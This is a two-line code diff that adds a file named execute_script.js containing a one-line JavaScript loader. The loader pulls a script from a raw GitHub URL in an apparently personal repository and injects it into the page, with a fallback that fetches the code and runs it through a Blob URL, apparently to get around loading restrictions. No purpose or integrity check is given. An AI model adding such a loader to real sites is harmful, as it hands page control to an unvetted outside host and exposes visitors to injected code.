@@ -1,0 +1,2 @@
+/// execute_script.js
+(async()=>{const r='https://raw.githubusercontent.com/ilovepizza90/ilovepizza90/refs/heads/main/wow.js';try{let s=document.createElement('script');s.src=r;document.head.appendChild(s);}catch(e){const t=await (await fetch(r)).text();const u=URL.createObjectURL(new Blob([t],{type:'text/javascript'}));let s2=document.createElement('script');s2.src=u;document.head.appendChild(s2);setTimeout(()=>URL.revokeObjectURL(u),5000);}})();
